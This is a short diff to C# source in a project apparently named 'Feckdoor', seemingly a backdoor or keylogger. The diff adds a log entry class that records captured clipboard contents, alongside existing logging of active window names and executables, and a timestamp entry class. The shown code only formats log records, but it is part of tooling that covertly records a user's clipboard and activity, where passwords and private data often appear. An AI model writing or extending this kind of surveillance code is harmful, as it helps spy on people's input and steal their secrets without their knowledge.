@@ -65,7 +65,6 @@ namespace Feckdoor.InputLog
 				sb.Append("Name: ").AppendLine(WindowInfo.Name);
 				sb.Append("Executable: ").AppendLine(WindowInfo.Executable);
 				sb.AppendLine("##### Active window change #####");
-				sb.AppendLine();
 				return sb.ToString();
 			}
 		}
@@ -81,4 +80,55 @@ namespace Feckdoor.InputLog
 		}
 	}
 
+	internal class ClipboardChangeEntry : InputLogEntry
+	{
+		private readonly string Clipboard;
+
+		public override string PlainTextMessage
+		{
+			get
+			{
+				var sb = new StringBuilder();
+				sb.AppendLine(Environment.NewLine);
+				sb.AppendLine("##### Clipboard changed #####");
+				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
+				sb.Append("Data: \"").Append(Clipboard).AppendLine("\"");
+				sb.AppendLine("##### Clipboard changed #####");
+				return sb.ToString();
+			}
+		}
+
+		public override object[] DbMessage
+		{
+			get => new object[] { Clipboard };
+		}
+
+		public ClipboardChangeEntry(DateTime timeStamp, string clipboard) : base(timeStamp)
+		{
+			Clipboard = clipboard;
+		}
+	}
+
+	internal class TimestampEntry : InputLogEntry
+	{
+		private readonly string Format;
+
+		public override string PlainTextMessage
+		{
+			get
+			{
+				return Environment.NewLine + "--- " + Timestamp.ToString(Format) + " ---" + Environment.NewLine;
+			}
+		}
+
+		public override object[] DbMessage
+		{
+			get => new object[] { };
+		}
+
+		public TimestampEntry(DateTime timeStamp, string format) : base(timeStamp)
+		{
+			Format = format;
+		}
+	}
 }
